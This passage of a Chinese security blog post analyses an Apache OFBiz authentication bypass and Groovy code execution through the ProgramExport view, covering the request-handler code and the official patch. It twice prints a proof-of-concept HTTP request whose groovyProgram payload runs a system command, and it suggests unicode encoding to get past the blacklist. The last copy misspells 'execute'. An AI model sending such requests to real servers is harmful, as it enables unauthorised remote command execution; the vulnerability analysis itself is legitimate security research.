  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;request-redirect-noparam&quot;</span>.equals(nextRequestResponse.type)) &#123;<br>               <span class="hljs-keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="hljs-string">&quot;[RequestHandler.doRequest]: Response is a Request redirect with no parameters.&quot;</span> + showSessionId(request), <span class="hljs-keyword">module</span>);<br>               callRedirect(makeLink(request, response, nextRequestResponse.value), response, request, ccfg.getStatusCodeString());<br>           &#125; <span class="hljs-comment">//前面的if都可以不用看，我们直接来到处理view response的块   </span><br>			<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;<br>               <span class="hljs-keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="hljs-string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="hljs-keyword">module</span>);<br><br>               <span class="hljs-comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span><br>               <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;<br>               renderView(viewName, requestMap.securityExternalView, request, response, saveName);<br>           &#125; <span class="hljs-keyword">else</span>&#123;<br>		..............<br>		&#125;<br></code></pre></td></tr></table></figure>

<p>这里的viewName是通过一个三目运算得来，<code>UtilValidate.isNotEmpty(overrideViewUri)</code>​overrideViewUri就是我们最开始获取到的ProgramExport了，所以这里肯定不为空。然后是<code>eventReturn == null || &quot;success&quot;.equals(eventReturn)</code>​这个判断，首先main获取到的eventReturn就为空，所以或运算得到就是true，最终<code>viewName</code>​被赋值为了<code>overrideViewUri</code>​，也就是ProgramExport了</p>
<p>跟进renderView方法,代码量还是有点多的，只截取几段关键性代码：</p>
<p>首先是ProgramExport的view配置信息的获取，在webtools的controllerxml中，ProgramExport的view设置为<code>&lt;view-map name=&quot;ProgramExport&quot; type=&quot;screen&quot; page=&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;/&gt;</code>​</p>
<p>而<code>EntityScreens.xml</code>​中的ProgramExport内容如下：</p>
<p>​<img src="/img/ofbizs1/image-20240816105858-vbcww2f.png" alt="image">​</p>
<p>ControllerConfig将这些内容全部解析之后存储起来，此时的render方法就会通过<code>getViewMapMap().get(xxxview)</code>​将其获取出来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"> ConfigXMLReader.<span class="hljs-type">ViewMap</span> <span class="hljs-variable">viewMap</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            viewMap = (view == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : getControllerConfig().getViewMapMap().get(view));<br>        &#125; <span class="hljs-keyword">catch</span> (WebAppConfigurationException e) &#123;<br>            Debug.logError(e, <span class="hljs-string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="hljs-keyword">module</span>);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHandlerException</span>(e);<br>        &#125;<br><br>.......<br><span class="hljs-keyword">if</span> (viewMap.page == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!allowExtView) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHandlerException</span>(<span class="hljs-string">&quot;No view to render.&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                nextPage = <span class="hljs-string">&quot;/&quot;</span> + oldView;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            nextPage = viewMap.page;<br>        &#125;<br><br>.......<br> <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="hljs-string">&quot;Rendering view [&quot;</span> + nextPage + <span class="hljs-string">&quot;] of type [&quot;</span> + viewMap.type + <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-keyword">module</span>);<br>            <span class="hljs-type">ViewHandler</span> <span class="hljs-variable">vh</span> <span class="hljs-operator">=</span> viewFactory.getViewHandler(viewMap.type);<br>            vh.render(view, nextPage, viewMap.info, contentType, charset, req, resp);<br>        &#125; <span class="hljs-keyword">catch</span> (ViewHandlerException e) &#123;<br>            <span class="hljs-type">Throwable</span> <span class="hljs-variable">throwable</span> <span class="hljs-operator">=</span> e.getNested() != <span class="hljs-literal">null</span> ? e.getNested() : e;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHandlerException</span>(e.getNonNestedMessage(), throwable);<br>        &#125;<br>.......<br></code></pre></td></tr></table></figure>

<p>此时的nextpage就是<code>component://webtools/widget/EntityScreens.xml#ProgramExport</code>​这一段字符串，用来定位具体的page设置。之后跟进vh.render方法,内容比较多，也是按照关键性逻辑来讲。</p>
<p>首先是对<code>component://webtools/widget/EntityScreens.xml#ProgramExport</code>​这个资源项的解析，他首先要定位到<code>component://webtools/widget/EntityScreens.xml</code>​的具体位置，然后读取此xml文件的所有内容，进行循环匹配<code>ProgramExport</code>​的操作，并将其取出。具体的实现是通过<code>ScreenFactory.getScreenFromLocation</code>​实现，并将ProgramExport的具体内容封装成了modelScreen对象</p>
<p>​<img src="/img/ofbizs1/image-20240816152221-tnlhrte.png" alt="image">​</p>
<p>具体看一下ModelScreen的构造方法</p>
<p>​<img src="/img/ofbizs1/image-20240816152502-0tw2n1r.png" alt="image">​</p>
<p>最后初始化了一个<code>ModelScreenWidget</code>​的内部类Section，这个Section就是EntityScreensxml文件中各视图元素的具体内容，而Section中又封装了<code>ProgramExport</code>​路由的action属性</p>
<p>​<img src="/img/ofbizs1/image-20240816152714-oqf1udm.png" alt="image">​</p>
<p>这个action属性的具体内容如下，它包含了我们要执行的groovy脚本的具体地址。</p>
<p>​<img src="/img/ofbizs1/image-20240816152859-j63hvzv.png" alt="image">​</p>
<p>后续的内容就是ModelScreen调用Section的renderWidgetString方法，进而调用到AbstractModelAction子类Script的runAction方法，执行Groovy脚本</p>
<p>​<img src="/img/ofbizs1/image-20240816153222-o8sb4eu.png" alt="image">​</p>
<p>​<img src="/img/ofbizs1/image-20240816153304-a0dox4y.png" alt="image">​</p>
<p>​<img src="/img/ofbizs1/image-20240816153239-dk7zns6.png" alt="image">​</p>
<p>漏洞利用到这里就结束了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /webtools/control/main/ProgramExport HTTP/<span class="hljs-number">1.1</span><br>Host: localhost:<span class="hljs-number">8443</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Content-Type: application/x-www-form-urlencoded<br>Priority: u=<span class="hljs-number">0</span>, i<br>Accept-Encoding: gzip, deflate, br, zstd<br>Cookie: Phpstorm-63ee3e40=51a64c0d-a81d-4ebf-b733-34a7e8541a1d; 6WNw_2132_ulastactivity=cd70Mo4Rmnmx8E7unOmyCD7JqvsYbj%2BjlrK8Gil4OGaCByIkgJVt; 6WNw_2132_nofavfid=<span class="hljs-number">1</span>; XDEBUG_SESSION=PHPSTORM; M5N4_2132_ulastactivity=c561BiOMrreY5EPC0B6wLBzqsvErShDer4PT7j9ClqA8%2Ba%2B99dRv; M5N4_2132_lastcheckfeed=<span class="hljs-number">1</span>%7C1716190113; M5N4_2132_nofavfid=<span class="hljs-number">1</span>; cookieconsent_status=dismiss<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/png,image/svg+xml,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Sec-Fetch-Site: none</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="hljs-comment">Content-Length: 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">groovyProgram=throw new Exception(&#x27;id&#x27;.execute().text);</span><br></code></pre></td></tr></table></figure>

<p>​<img src="/img/ofbizs1/image-20240816194840-q2oytf4.png" alt="image">​</p>
<p>‍</p>
<p>‍</p>
<h1 id="深入利用和其他"><a href="#深入利用和其他" class="headerlink" title="深入利用和其他"></a>深入利用和其他</h1><h2 id="编码绕过黑名单waf"><a href="#编码绕过黑名单waf" class="headerlink" title="编码绕过黑名单waf"></a>编码绕过黑名单waf</h2><p>首先就是Groovy脚本中是存在waf的</p>
<p>​<img src="/img/ofbizs1/image-20240816194947-rj7p9cw.png" alt="image">​</p>
<p>具体内容如下</p>
<p>​<img src="/img/ofbizs1/image-20240816194707-76jbfum.png" alt="image">​</p>
<p>这其实很容易绕过，有很多种方式，但是最为经典的还是用unicode去绕，因为本身java中字符串就是由unicode编码的，而我们传入的groovyProgram也是字符串形式。当然，如果不用unicode去绕过，也有很多绕过的方式，这里就不细讲，主要是关于groovy的相关知识。</p>
<p>‍</p>
<h2 id="鉴权思路总结"><a href="#鉴权思路总结" class="headerlink" title="鉴权思路总结"></a>鉴权思路总结</h2><p>在上文中我应该提到过，但是为了文章的结构性我没有在当时细讲，只是提了一嘴。这里就好好的分析一下</p>
<p>我们看到请求路由：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">webtools/control/main/ProgramExport<br></code></pre></td></tr></table></figure>

<p>在doRequest方法中关于路由的截取处理的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"> 	<span class="hljs-comment">//cname=&quot;webtools&quot;</span><br><span class="hljs-type">String</span> <span class="hljs-variable">cname</span> <span class="hljs-operator">=</span> UtilHttp.getApplicationName(request); <br>     <br>	<span class="hljs-comment">//defaultRequestUri=&quot;main&quot;</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">defaultRequestUri</span> <span class="hljs-operator">=</span> RequestHandler.getRequestUri(request.getPathInfo());<br><br>	<span class="hljs-comment">//Servlet-API中自带的方法，path=&quot;main/ProgramExport&quot;</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getPathInfo();<br>	<span class="hljs-comment">//requestUri=&quot;main&quot;</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">requestUri</span> <span class="hljs-operator">=</span> getRequestUri(path);<br>	<span class="hljs-comment">//overrideViewUri=&quot;ProgramExport&quot;</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">overrideViewUri</span> <span class="hljs-operator">=</span> getOverrideViewUri(path);<br></code></pre></td></tr></table></figure>

<p>光从这几条代码和结果中看不出什么,接下来我们来看一下webtools模块下web.xml的内容：</p>
<p>对于总路由请求ControllerServlet的url-pattern的设置路由如下</p>
<p>​<img src="/img/ofbizs1/image-20240816200853-3ywz1c7.png" alt="image">​</p>
<p>也就是这一段url-pattern的值，限制了我们调用HttpRequest.getPathInfo()获取路由信息就会往control这一层之后去截取。这也是常用于 RESTful 风格的 API 路由，通过路由来动态获取请求信息。之后的<code>getRequestUri</code>​和<code>getOverrideViewUri</code>​方法，就是固定的将<code>main/ProgramExport</code>​这一段字符串按照<code>/</code>​进行分割，<code>RequestUri</code>​取前一个，<code>OverrideViewUri</code>​取后一个。</p>
<p>在此之后<code>RequestUri</code>​将作为RequestMaps的主要判断依据，从对应的Controller.xml中获取对应的路由配置</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);<br></code></pre></td></tr></table></figure>

<p>具体看到<code>resolveURI</code>​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> Collection&lt;RequestMap&gt; <span class="hljs-title function_">resolveURI</span><span class="hljs-params">(ControllerConfig ccfg, HttpServletRequest req)</span> &#123;<br>       Map&lt;String, List&lt;RequestMap&gt;&gt; requestMapMap = ccfg.getRequestMapMap();<br>       Map&lt;String, ConfigXMLReader.ViewMap&gt; viewMapMap = ccfg.getViewMapMap();<br>       <span class="hljs-type">String</span> <span class="hljs-variable">defaultRequest</span> <span class="hljs-operator">=</span> ccfg.getDefaultRequest();<br>       <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> req.getPathInfo();<br>       <span class="hljs-type">String</span> <span class="hljs-variable">requestUri</span> <span class="hljs-operator">=</span> getRequestUri(path);<br>       <span class="hljs-type">String</span> <span class="hljs-variable">viewUri</span> <span class="hljs-operator">=</span> getOverrideViewUri(path);<br>       Collection&lt;RequestMap&gt; rmaps;<br>       <span class="hljs-comment">//最重要的就是这段if判断了，上文细讲过，产生的结果就是整个RequestMaps中存入的内容是&quot;main&quot;对应的路由信息，这里就不在赘述了。</span><br>	<span class="hljs-keyword">if</span> (requestMapMap.containsKey(requestUri)<br>               <span class="hljs-comment">// Ensure that overridden view exists.</span><br>               &amp;&amp; (viewUri == <span class="hljs-literal">null</span> || viewMapMap.containsKey(viewUri) <br>               || (<span class="hljs-string">&quot;SOAPService&quot;</span>.equals(requestUri) &amp;&amp; <span class="hljs-string">&quot;wsdl&quot;</span>.equalsIgnoreCase(req.getQueryString()))))&#123;<br>           rmaps = requestMapMap.get(requestUri);<br>       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (defaultRequest != <span class="hljs-literal">null</span>) &#123;<br>           rmaps = requestMapMap.get(defaultRequest);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           rmaps = <span class="hljs-literal">null</span>;<br>       &#125;<br>       <span class="hljs-keyword">return</span> rmaps != <span class="hljs-literal">null</span> ? rmaps : Collections.emptyList();<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>而之后的RequestMap单个的获取，也仅仅只是从rmaps中遍历每一个requestmap，然后匹配到对应的map进行获取。对应到示例路由就是</p>
<p>​<img src="/img/ofbizs1/image-20240816205911-p12p5vw.png" alt="image">​</p>
<p>由于security标签中的auth属性值为false，所以当前取到的requestMap中<code>securityAuth</code>​属性值为false，从而也能绕过这一段鉴权逻辑。这也是Y4tacker师傅发现的该漏洞绕过鉴权的思路</p>
<p>​<img src="/img/ofbizs1/image-20240816210107-l6mjpfo.png" alt="image">​</p>
<p>然而requestMap的作用还不止这些，当走完处理requestMap的Event逻辑之后（有event就会率先执行event的内容，没有就直接往下走），要把结果返回出去。这里也就是涉及到了<code>&lt;response&gt;</code>​标签的作用，它的type为view，表示最后的返回结果要通过视图解析。</p>
<p>具体的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;<br>                <span class="hljs-keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="hljs-string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="hljs-keyword">module</span>);<br><br>                <span class="hljs-comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;<br>                renderView(viewName, requestMap.securityExternalView, request, response, saveName);<br></code></pre></td></tr></table></figure>

<p>viewName被赋值为了overrideViewUri，也就是ProgramExport。再从webtools的.controller.xml中读取ProgramExport的view标签内容，发现它的page是一段加载路径</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;view-map name=<span class="hljs-string">&quot;ProgramExport&quot;</span> type=<span class="hljs-string">&quot;screen&quot;</span> page=<span class="hljs-string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>

<p>到后面的内容其实根据page的路径去读取EntityScreens.xml文件内容，并且定位到ProgramExport所对应属性值，加载groovy脚本。上文分析过就不细谈了。</p>
<p>所以我们最终利用的还是overrideViewUri</p>
<p>‍</p>
<h2 id="Groovy利用总结"><a href="#Groovy利用总结" class="headerlink" title="Groovy利用总结"></a>Groovy利用总结</h2><p>为什么最终利用到的GroovyPayload是<code>throw Exception(&quot;id&quot;.execuate().text)</code>​呢?</p>
<p>首先不论是哪种groovypayload，即使你直接<code>&quot;id&quot;.execuate().text</code>​传值过去都是没问题的，但是问题是我们需要有回显，也就是说当我们这么执行过后，sink的groovy脚本中是没有给我们把groovyshell.evaluate()的结果回显出来的,然后回到源码处</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">shell.parse(groovyProgram)<br>     shell.evaluate(groovyProgram)<br>     recordValues = shell.getVariable(<span class="hljs-string">&quot;recordValues&quot;</span>)<br>     xmlDoc = GenericValue.makeXmlDocument(recordValues)<br>     context.put(<span class="hljs-string">&quot;xmlDoc&quot;</span>, xmlDoc)<br> &#125; <span class="hljs-keyword">catch</span>(MultipleCompilationErrorsException e) &#123;<br>     request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, e)<br>     <span class="hljs-keyword">return</span><br> &#125; <span class="hljs-keyword">catch</span>(groovy.lang.MissingPropertyException e) &#123;<br>     request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, e)<br>     <span class="hljs-keyword">return</span><br> &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>     request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, e)<br>     <span class="hljs-keyword">return</span><br> &#125; <span class="hljs-keyword">catch</span>(NullPointerException e) &#123;<br>     request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, e)<br>     <span class="hljs-keyword">return</span><br> &#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>     request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, e)<br>     <span class="hljs-keyword">return</span><br> &#125;<br></code></pre></td></tr></table></figure>

<p>最后有5段catch,每一段catch都会将我们的此次shell.evaluate的执行过程中遇到的exception全部当作结果回显出来,这也是为什么我们要指定<code>throw Exception</code>​,也就为了能够走到catch的情况中,回显.</p>
<h2 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h2><p>再来看一下官方具体怎么修的</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/31d8d7">https://github.com/apache/ofbiz-framework/commit/31d8d7</a></p>
<p>添加如下鉴权groovy代码</p>
<p>​<img src="/img/ofbizs1/image-20240817094112-jmhydp4.png" alt="image">​</p>
<p>​<img src="/img/ofbizs1/image-20240817094242-069vqsy.png" alt="image">​</p>
<p>具体的实现代码：</p>
<p>​<img src="/img/ofbizs1/image-20240818093845-24itm6m.png" alt="image">​</p>
<p>其实本质上就是从数据库中select出所有的有权限用户，然后匹配此时Groovy脚本中指定的<code>ENTITY_MAINT</code>​。这个值具体有没有默认存入数据库就没去看了，现在思考是否存在其他利用方式？</p>
<p>‍</p>
<h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p>最后贴一下poc，groovyProgram还是用unicode编码一下，这里我就按原始的来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /webtools/control/main/ProgramExport HTTP/<span class="hljs-number">1.1</span><br>Host: localhost:<span class="hljs-number">8443</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Content-Type: application/x-www-form-urlencoded<br>Priority: u=<span class="hljs-number">0</span>, i<br>Accept-Encoding: gzip, deflate, br, zstd<br>Cookie: Phpstorm-63ee3e40=51a64c0d-a81d-4ebf-b733-34a7e8541a1d; 6WNw_2132_ulastactivity=cd70Mo4Rmnmx8E7unOmyCD7JqvsYbj%2BjlrK8Gil4OGaCByIkgJVt; 6WNw_2132_nofavfid=<span class="hljs-number">1</span>; XDEBUG_SESSION=PHPSTORM; M5N4_2132_ulastactivity=c561BiOMrreY5EPC0B6wLBzqsvErShDer4PT7j9ClqA8%2Ba%2B99dRv; M5N4_2132_lastcheckfeed=<span class="hljs-number">1</span>%7C1716190113; M5N4_2132_nofavfid=<span class="hljs-number">1</span>; cookieconsent_status=dismiss<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/png,image/svg+xml,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Sec-Fetch-Site: none</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="hljs-comment">Content-Length: 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">groovyProgram=throw Exception(&quot;id&quot;.execuate().text)</span><br></code></pre></td></tr></table></figure>

<p>‍</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/post/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">JDBC-Mysql反序列化 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/logo/D5B030D454D35C3F06BCF706E7F7948A.png" alt="Logo"></a><h1 id="Dr"><a href="/">stoocea</a></h1><div id="description"><p>time thicking away</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">前置准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">具体分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ControllerServlet"><span class="toc-number">2.1.</span> <span class="toc-text">ControllerServlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RequestHandler%E7%9A%84%E5%85%B7%E4%BD%93%E8%A7%A3%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">RequestHandler的具体解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%80%A7%E5%8F%82%E6%95%B0%E8%8E%B7%E5%8F%96"><span class="toc-number">2.2.1.</span> <span class="toc-text">关键性参数获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">鉴权绕过分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%E6%B8%B2%E6%9F%93"><span class="toc-number">2.2.3.</span> <span class="toc-text">结果渲染</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E5%85%B6%E4%BB%96"><span class="toc-number">3.</span> <span class="toc-text">深入利用和其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95waf"><span class="toc-number">3.1.</span> <span class="toc-text">编码绕过黑名单waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%89%B4%E6%9D%83%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.</span> <span class="toc-text">鉴权思路总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Groovy%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text">Groovy利用总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#patch%E5%88%86%E6%9E%90"><span class="toc-number">3.4.</span> <span class="toc-text">patch分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-number">3.5.</span> <span class="toc-text">利用总结</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>